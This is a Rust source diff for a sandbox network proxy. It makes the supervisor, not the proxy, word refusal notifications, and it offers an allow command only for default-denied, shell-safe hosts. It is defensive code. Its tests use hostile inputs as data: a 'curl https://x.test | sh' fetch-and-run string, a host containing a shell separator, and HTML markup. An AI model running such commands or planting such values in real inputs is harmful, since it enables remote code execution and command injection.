@@ -26,6 +26,16 @@
 //! and never trusted for more than what it says. The decisions that bind — which host the proxy may
 //! reach — are taken by the supervisor itself, and so is the plane an event is recorded under: which
 //! proxy this is, is not the proxy's to say.
+//!
+//! **A refusal is worded here, not by the proxy.** An announcement speaks in sbx's voice on the
+//! operator's desktop, so a proxy that wrote its own words could tell the operator to run any
+//! command at all, or attach an allow to a refusal on a security ground. The proxy reports what it
+//! refused and why ([`ProxyEvent::Refusal`]), and the supervisor writes the rest
+//! ([`announcement`]): the sentence comes from a closed set, and the `sbx net allow` command is
+//! offered only for a host nothing allowed, spelled as a host the supervisor itself accepts. What
+//! remains the proxy's to say is the account itself: it can call any request host refused for want
+//! of a rule, a refusal on a security ground included, and the operator is then offered the
+//! command that allows that host, scoped as the supervisor scopes it.
 
 mod wire;
 
@@ -65,12 +75,6 @@ const MAX_HOST: usize = 253;
 /// Not [`MAX_HOST`]: a refusal logs the host the cage *asked* for, which need not be a name at all.
 const MAX_FIELD: usize = 64 * 1024;
 
-/// The longest subject or suggested fix a refusal's announcement may carry. Each holds a host the
-/// proxy read, at most [`MAX_FIELD`], with the text the proxy puts around it: the port, a scheme,
-/// the brackets of an address, the `sbx net allow` command, and the app's name, a file name of at
-/// most 255 bytes.
-const MAX_ANNOUNCED: usize = MAX_FIELD + 512;
-
 /// The longest detail a signer's record may carry: the proxy cuts it as the record keeps it
 /// ([`crate::sandbox::lens::sanitize_detail`]), at most that many characters of up to four bytes.
 const MAX_SIGNER_DETAIL: usize = 4 * crate::sandbox::lens::DETAIL_MAX;
@@ -88,8 +92,15 @@ pub(super) const MAX_FLOW_COUNTS: usize = 4096;
 pub(crate) enum ProxyEvent<C = Masked> {
     /// A decision, counted for `sbx net stats`.
     Stat { host: String, kind: StatKind },
-    /// A refusal to announce on the desktop, one of the network's.
-    Refusal(Block),
+    /// A refusal to announce on the desktop, one of the network's: the destination refused, on
+    /// which plane, and the reason its decision is logged with. The words are the supervisor's
+    /// ([`announcement`]).
+    Refusal {
+        proto: Proto,
+        host: String,
+        port: u16,
+        reason: String,
+    },
     /// A credential a signer formed, or one it would not form. `detail` is already redacted
     /// against the launch's credential needles, then cut as the record keeps it: no value a signer
     /// was handed leaves the proxy in the clear.
@@ -131,9 +142,7 @@ impl ProxyEvent {
     fn weight(&self) -> usize {
         match self {
             ProxyEvent::Stat { host, .. } => host.len(),
-            ProxyEvent::Refusal(block) => {
-                block.subject.len() + block.reason.len() + block.detail.len() + block.fix.len()
-            }
+            ProxyEvent::Refusal { host, reason, .. } => host.len() + reason.len(),
             ProxyEvent::Signer { detail, .. } => detail.len(),
             ProxyEvent::Logged { entry, .. } => entry.weight(),
             ProxyEvent::Status { .. } | ProxyEvent::CaptureExpected { .. } => 0,
@@ -157,7 +166,17 @@ impl<C> ProxyEvent<C> {
     ) -> Result<ProxyEvent<D>, E> {
         Ok(match self {
             ProxyEvent::Stat { host, kind } => ProxyEvent::Stat { host, kind },
-            ProxyEvent::Refusal(block) => ProxyEvent::Refusal(block),
+            ProxyEvent::Refusal {
+                proto,
+                host,
+                port,
+                reason,
+            } => ProxyEvent::Refusal {
+                proto,
+                host,
+                port,
+                reason,
+            },
             ProxyEvent::Signer { kind, detail } => ProxyEvent::Signer { kind, detail },
             ProxyEvent::Logged { id, entry } => ProxyEvent::Logged { id, entry },
             ProxyEvent::Status { id, status } => ProxyEvent::Status { id, status },
@@ -273,6 +292,9 @@ pub(crate) struct Sinks {
     /// The tunnels open right now, for `sbx net live`.
     pub(crate) flows: Option<Arc<FlowRegistry>>,
     pub(crate) plane: Plane,
+    /// The `sbx app <name>` the launch runs, which the `sbx net allow` an announcement suggests is
+    /// scoped to, or `None` for a bare `sbx run`, whose suggestion writes the project's policy.
+    pub(crate) app: Option<String>,
 }
 
 /// Nothing kept, under the session's own plane: what a test that attaches only some structures
@@ -288,6 +310,7 @@ impl Default for Sinks {
             capture: None,
             flows: None,
             plane: Plane::Agent,
+            app: None,
         }
     }
 }
@@ -644,11 +667,23 @@ impl Applier {
                     stats.record(&host, kind);
                 }
             }
-            ProxyEvent::Refusal(block) => {
+            ProxyEvent::Refusal {
+                proto,
+                host,
+                port,
+                reason,
+            } => {
                 if let Some(notifier) = &sinks.notifier
-                    && announceable(&block)
+                    && host.len() <= MAX_FIELD
+                    && reason.len() <= MAX_FIELD
                 {
-                    notifier.block(block);
+                    notifier.block(announcement(
+                        proto,
+                        &host,
+                        port,
+                        &reason,
+                        sinks.app.as_deref(),
+                    ));
                 }
             }
             ProxyEvent::Signer { kind, detail } => {
@@ -751,16 +786,63 @@ impl Applier {
     }
 }
 
-/// Whether `block` is an announcement the proxy can have made: a refusal of the network's (which
-/// lens refused is no more the proxy's to say than the plane its decisions are recorded under), its
-/// subject and fix within [`MAX_ANNOUNCED`], and its reason, the one its decision is logged with, and
-/// its detail within [`MAX_FIELD`].
-fn announceable(block: &Block) -> bool {
-    block.event == NotifyEvent::Network
-        && block.subject.len() <= MAX_ANNOUNCED
-        && block.fix.len() <= MAX_ANNOUNCED
-        && block.reason.len() <= MAX_FIELD
-        && block.detail.len() <= MAX_FIELD
+/// The announcement of a refusal the proxy reported: `host` and `port` refused on the plane
+/// `proto`, for the `reason` its decision is logged with, in a launch that runs `app`.
+///
+/// Every word is the supervisor's, and the lens is the network's: which lens refused is no more the
+/// proxy's to say than the plane its decisions are recorded under. The sentence is the one
+/// [`refusal_detail`] keeps for the reason. The command that would allow the host is offered only
+/// where allowing is a sound suggestion, a host nothing allowed (`denied-default`), and only around
+/// a host the supervisor accepts ([`crate::allowlist::is_request_host`]): letters, digits, `-`, `_`
+/// and `.`, or an address, so nothing in it means anything to a shell or to a notification's
+/// markup. It is spelled by the [`super::rule_destination`] and [`super::allow_command`] the
+/// refusal bodies use, so the toast and the body never tell the user to run different commands.
+fn announcement(proto: Proto, host: &str, port: u16, reason: &str, app: Option<&str>) -> Block {
+    // Only a host that nothing allowed gets a copy-paste `sbx net allow`. A request stopped by an
+    // explicit deny rule, or by a security guard (a credential on its way out, an SSRF target), must
+    // never carry one: telling the user to allow a credential leak would be actively harmful advice,
+    // and re-allowing what they deliberately denied is not the fix either.
+    let fix = if reason == "denied-default" && crate::allowlist::is_request_host(host) {
+        super::allow_command(app, &super::rule_destination(proto, host, port))
+    } else {
+        String::new()
+    };
+    Block {
+        event: NotifyEvent::Network,
+        subject: format!("{host}:{port}"),
+        reason: reason.to_string(),
+        detail: refusal_detail(reason).to_string(),
+        fix,
+    }
+}
+
+/// One sentence explaining a refusal category to the person the notification is for.
+///
+/// The categories are the stable tokens the refusal bodies and `sbx net logs` already use, so a
+/// notification and the log line for the same request name the same thing. Pure, and total: an
+/// unrecognized token still yields a usable sentence rather than an empty body, which is what keeps
+/// a refusal category added later from silently announcing nothing, and what keeps a token a proxy
+/// made up from reaching the desktop as anything but this fallback.
+fn refusal_detail(reason: &str) -> &'static str {
+    match reason {
+        "denied-default" => "no rule in the network policy allows this host",
+        "denied-by-rule" => "an explicit deny rule in the network policy blocked it",
+        "denied-method" => "the host is allowed, but not for this HTTP method",
+        "asked-denied" => "the live decision was `deny`, or the ask timed out",
+        "outbound-secret" => {
+            "the request was carrying a configured secret out of the cage (credential leak refused)"
+        }
+        "ssrf-blocked" => "the target resolves to a private or link-local address",
+        "host-mismatch" => "the request's `Host` did not match the host it was tunnelled to",
+        "splice-cap" => "too many raw tunnels are already open for this session",
+        "ws-injection-refused" => "a credential cannot be injected into a WebSocket upgrade",
+        "http2-ask-unsupported" => "an HTTP/2 host cannot be decided interactively",
+        "supervisor-denied" => {
+            "the supervisor's copy of the network policy refused it while a session rule changed"
+        }
+        "supervisor-busy" => "the supervisor was already opening as many connections as it opens",
+        _ => "the network policy refused it",
+    }
 }
 
 /// A lock that a panicking holder does not take down with it: every value guarded here stays
@@ -1114,18 +1196,23 @@ mod tests {
         assert_eq!(kept[0].host.len(), MAX_HOST + 1);
     }
 
-    /// What a notifier in a test was handed: the summary of each announcement, in order.
+    /// What a notifier in a test was handed: `summary|body` for each announcement, in order.
     struct Announced(Arc<Mutex<Vec<String>>>);
 
     impl crate::sandbox::notify_sink::Sink for Announced {
-        fn deliver(&mut self, summary: &str, _: &str, _: Option<u32>) -> Result<Option<u32>, ()> {
-            lock(&self.0).push(summary.to_string());
+        fn deliver(
+            &mut self,
+            summary: &str,
+            body: &str,
+            _: Option<u32>,
+        ) -> Result<Option<u32>, ()> {
+            lock(&self.0).push(format!("{summary}|{body}"));
             Ok(None)
         }
     }
 
-    /// The summaries of what `blocks` announce, sent as the proxy sends them.
-    fn announced(blocks: Vec<Block>) -> Vec<String> {
+    /// What `refusals` announce, sent as the proxy sends them, in a launch that runs `app`.
+    fn announced(refusals: Vec<ProxyEvent>, app: Option<&str>) -> Vec<String> {
         use crate::notify::{NotifyMode, NotifyPolicy};
         let seen = Arc::new(Mutex::new(Vec::new()));
         let notifier = Arc::new(Notifier::recording(
@@ -1134,10 +1221,11 @@ mod tests {
         ));
         let (events, applier) = spawn_joinable(Sinks {
             notifier: Some(Arc::clone(&notifier)),
+            app: app.map(str::to_string),
             ..Sinks::default()
         });
-        for block in blocks {
-            events.send(ProxyEvent::Refusal(block));
+        for refusal in refusals {
+            events.send(refusal);
         }
         // Every reporter gone, the applying side ends and lets go of the notifier, whose drop
         // delivers what it holds.
@@ -1151,78 +1239,122 @@ mod tests {
         lock(&seen).clone()
     }
 
-    /// A network refusal of `subject`, as the proxy announces one.
-    fn refusal(subject: &str) -> Block {
-        Block {
-            event: NotifyEvent::Network,
-            subject: subject.into(),
-            reason: "denied-default".into(),
-            detail: "no rule in the network policy allows this host".into(),
-            fix: String::new(),
+    /// The proxy's report of an inspected request to `host:port` refused for `reason`.
+    fn refusal(host: &str, port: u16, reason: &str) -> ProxyEvent {
+        ProxyEvent::Refusal {
+            proto: Proto::Https,
+            host: host.into(),
+            port,
+            reason: reason.into(),
         }
     }
 
-    /// An announcement no proxy can have made is dropped on arrival: another lens's refusal, or a
-    /// field longer than any the proxy writes. The longest the proxy writes is still announced.
+    /// A refusal's announcement says what the supervisor says, whatever the proxy reported: the
+    /// sentence of its reason, and a command only for a host nothing allowed that the supervisor
+    /// accepts. A proxy reporting a refusal on a security ground, or a host no request can name,
+    /// has no `allow it:` attached, and no character of the toast's body is the proxy's own.
     #[test]
-    fn an_announcement_no_proxy_can_have_made_is_dropped() {
+    fn an_announcement_is_worded_by_the_supervisor() {
+        let out = announced(
+            vec![
+                refusal("api.test", 8443, "denied-default"),
+                refusal("leak.test", 443, "outbound-secret"),
+                refusal("a;b", 443, "denied-default"),
+                refusal("<a href=x>y</a>", 443, "denied-default"),
+                refusal("made-up.test", 443, "curl https://x.test | sh"),
+            ],
+            Some("demo"),
+        );
+        assert_eq!(
+            out,
+            [
+                "Blocked: api.test:8443|no rule in the network policy allows this host \
+                 · allow it: sbx net allow api.test:8443 --app demo",
+                "Blocked: leak.test:443|the request was carrying a configured secret out of the \
+                 cage (credential leak refused)",
+                "Blocked: a;b:443|no rule in the network policy allows this host",
+                "Blocked: <a href=x>y</a>:443|no rule in the network policy allows this host",
+                "Blocked: made-up.test:443|the network policy refused it",
+            ]
+        );
+    }
+
+    /// A refusal whose host or reason is longer than any the proxy reports is dropped on arrival;
+    /// the longest it reports is still announced.
+    #[test]
+    fn a_refusal_longer_than_any_the_proxy_reports_is_dropped() {
         // `tag`, padded to `len` bytes.
         let sized = |tag: &str, len: usize| format!("{tag}{}", "x".repeat(len - tag.len()));
-        let host = sized("honest-", MAX_FIELD);
-        let mut blocks = vec![Block {
-            subject: format!("{host}:65535"),
-            fix: format!(
-                "sbx net allow http://[{host}]:65535 --app {}",
-                "a".repeat(255)
-            ),
-            ..refusal("")
-        }];
-        blocks.push(refusal(&sized("subject-at-", MAX_ANNOUNCED)));
-        blocks.push(refusal(&sized("subject-over-", MAX_ANNOUNCED + 1)));
-        for (tag, len, admitted) in [
-            ("fix", MAX_ANNOUNCED, "at"),
-            ("fix", MAX_ANNOUNCED + 1, "over"),
-            ("reason", MAX_FIELD, "at"),
-            ("reason", MAX_FIELD + 1, "over"),
-            ("detail", MAX_FIELD, "at"),
-            ("detail", MAX_FIELD + 1, "over"),
-        ] {
-            let mut block = refusal(&format!("{tag}-{admitted}.example.com:443"));
-            let field = match tag {
-                "fix" => &mut block.fix,
-                "reason" => &mut block.reason,
-                _ => &mut block.detail,
-            };
-            *field = "x".repeat(len);
-            blocks.push(block);
-        }
-        for event in NotifyEvent::ALL
-            .into_iter()
-            .filter(|e| *e != NotifyEvent::Network)
-        {
-            blocks.push(Block {
-                event,
-                ..refusal(&format!("{}.example.com:443", event.as_str()))
-            });
-        }
-
-        let out = announced(blocks);
+        let out = announced(
+            vec![
+                refusal(&sized("host-at-", MAX_FIELD), 443, "denied-default"),
+                refusal(&sized("host-over-", MAX_FIELD + 1), 443, "denied-default"),
+                refusal("reason-at.test", 443, &sized("r", MAX_FIELD)),
+                refusal("reason-over.test", 443, &sized("r", MAX_FIELD + 1)),
+            ],
+            None,
+        );
         let summaries: Vec<&str> = out
             .iter()
             .map(|s| s.strip_prefix("Blocked: ").unwrap_or(s))
             .collect();
-        let expected = [
-            "honest-",
-            "subject-at-",
-            "fix-at.",
-            "reason-at.",
-            "detail-at.",
-        ];
-        assert_eq!(summaries.len(), expected.len(), "{:?}", summaries);
+        let expected = ["host-at-", "reason-at."];
+        assert_eq!(summaries.len(), expected.len(), "{summaries:.40?}");
         for (summary, expected) in summaries.iter().zip(expected) {
             assert!(
                 summary.starts_with(expected),
                 "{summary:.40} for {expected}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_host_nothing_allowed_carries_the_command_that_allows_it() {
+        let b = announcement(Proto::Https, "api.example.com", 443, "denied-default", None);
+        assert_eq!(b.event, NotifyEvent::Network);
+        assert_eq!(b.subject, "api.example.com:443");
+        assert_eq!(b.reason, "denied-default");
+        assert_eq!(b.fix, "sbx net allow api.example.com");
+        assert!(b.detail.contains("no rule"));
+    }
+
+    #[test]
+    fn a_security_refusal_never_suggests_allowing_it() {
+        // The harmful advice this guards: a request is refused *because* it was carrying a
+        // credential out of the cage, and the notification tells the user to allow that host —
+        // which would open the very leak the guard just closed. Same for an SSRF target.
+        for reason in ["outbound-secret", "ssrf-blocked", "host-mismatch"] {
+            let b = announcement(Proto::Https, "api.example.com", 443, reason, None);
+            assert_eq!(b.fix, "", "`{reason}` must offer no fix, got {:?}", b.fix);
+        }
+        // And an explicit deny rule is a decision already taken — not something to undo in a toast.
+        let b = announcement(Proto::Https, "api.example.com", 443, "denied-by-rule", None);
+        assert_eq!(b.fix, "");
+    }
+
+    #[test]
+    fn every_refusal_category_the_proxy_emits_has_its_own_sentence() {
+        // A category with no sentence would announce a blank explanation. The list is the set of
+        // tokens the refusal sites record; the fallback covers one added later, but every token that
+        // exists today must be spelled out.
+        for reason in [
+            "denied-default",
+            "denied-by-rule",
+            "denied-method",
+            "asked-denied",
+            "outbound-secret",
+            "ssrf-blocked",
+            "host-mismatch",
+            "splice-cap",
+            "ws-injection-refused",
+            "http2-ask-unsupported",
+            "supervisor-denied",
+            "supervisor-busy",
+        ] {
+            assert_ne!(
+                refusal_detail(reason),
+                refusal_detail("something-added-later"),
+                "`{reason}` must have its own sentence, not the fallback"
             );
         }
     }
@@ -1327,13 +1459,12 @@ mod tests {
                 host: "api.example.com".into(),
                 kind: StatKind::Blocked,
             },
-            ProxyEvent::Refusal(Block {
-                event: crate::notify::NotifyEvent::Network,
-                subject: "api.example.com:8443".into(),
+            ProxyEvent::Refusal {
+                proto: Proto::Http,
+                host: "a \"quoted\" \u{1b}[31m host\n".into(),
+                port: 8443,
                 reason: "denied-default".into(),
-                detail: "a \"quoted\" \u{1b}[31m sentence\n".into(),
-                fix: "sbx net allow api.example.com:8443".into(),
-            }),
+            },
             ProxyEvent::Signer {
                 kind: SignerKind::Refuse,
                 detail: "demo: GET api.example.com/ \u{0}".into(),
@@ -1384,7 +1515,7 @@ mod tests {
     fn kind(event: &ProxyEvent) -> &'static str {
         match event {
             ProxyEvent::Stat { .. } => "stat",
-            ProxyEvent::Refusal(_) => "refusal",
+            ProxyEvent::Refusal { .. } => "refusal",
             ProxyEvent::Signer { .. } => "signer",
             ProxyEvent::Logged { .. } => "logged",
             ProxyEvent::Status { .. } => "status",
@@ -1687,22 +1818,14 @@ mod tests {
                 select(vec![StatKind::Allow, StatKind::Deny, StatKind::Blocked])
             )
                 .prop_map(|(host, kind)| ProxyEvent::Stat { host, kind }),
-            (
-                select(NotifyEvent::ALL.to_vec()),
-                text(),
-                text(),
-                text(),
-                text()
-            )
-                .prop_map(|(event, subject, reason, detail, fix)| {
-                    ProxyEvent::Refusal(Block {
-                        event,
-                        subject,
-                        reason,
-                        detail,
-                        fix,
-                    })
-                }),
+            (protos(), text(), any::<u16>(), text()).prop_map(|(proto, host, port, reason)| {
+                ProxyEvent::Refusal {
+                    proto,
+                    host,
+                    port,
+                    reason,
+                }
+            }),
             (select(vec![SignerKind::Sign, SignerKind::Refuse]), text())
                 .prop_map(|(kind, detail)| ProxyEvent::Signer { kind, detail }),
             (numbers(), log_entries()).prop_map(|(id, entry)| ProxyEvent::Logged { id, entry }),
